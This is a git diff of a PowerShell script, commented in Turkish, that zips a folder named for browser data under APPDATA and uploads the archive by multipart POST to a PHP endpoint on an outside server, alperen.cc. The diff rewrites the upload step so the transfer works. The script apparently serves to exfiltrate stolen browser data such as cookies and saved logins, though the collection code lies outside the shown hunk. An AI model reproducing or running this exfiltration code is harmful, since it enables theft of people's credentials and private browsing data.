@@ -86,34 +86,42 @@ if (Test-Path $zipFilePath) {
 # Klasörü ZIP dosyasına sıkıştırma
 Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
 
-
 # Yüklemek istediğiniz dosyanın yolu
+$zipFilePath = "$env:APPDATA\ZippedBrowserData\BrowserData.zip"  # ZIP dosyasının tam yolu
+$url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
+
 if (Test-Path $zipFilePath) {
     $filePath = $zipFilePath
 
-    # PHP dosya yükleme URL'si
-    $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
+    # Dosya içeriğini oku
+    $fileStream = [System.IO.File]::OpenRead($filePath)
+    
+    # Multipart/form-data için boundary oluşturma
+    $boundary = "---------------------------" + [guid]::NewGuid().ToString()
+    $contentType = "multipart/form-data; boundary=$boundary"
 
-    # Dosya yüklemek için form data oluşturma
-    $form = @{
-        fileToUpload = Get-Item $filePath
-    }
+    # Body oluşturma
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$($filePath.Split('\')[-1])`""
+    $bodyLines += "Content-Type: application/octet-stream"
+    $bodyLines += ""
+    
+    # Dosya içeriğini ekleme
+    $bodyLines += [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($filePath))
+    $bodyLines += "--$boundary--"
+    $bodyLines += ""
 
-    # Dosya yüklemek için Body ayarlama
-    $body = @{
-        fileToUpload = Get-Item $filePath
-    }
+    $httpRequestStream = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "`r`n")
 
     # POST isteği gönderme
     try {
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "multipart/form-data" -ErrorAction Stop
-        # Yanıtı yazdırma
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $httpRequestStream -ContentType $contentType -ErrorAction Stop
         Write-Output $response
     } catch {
-        Write-Host "Dosya yüklenirken bir hata oluştu: $_"
+        Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
     }
 } else {
-    Write-Host "ZIP dosyası oluşturulamadığı için yükleme yapılmadı."
+    Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
 }
 
-exit
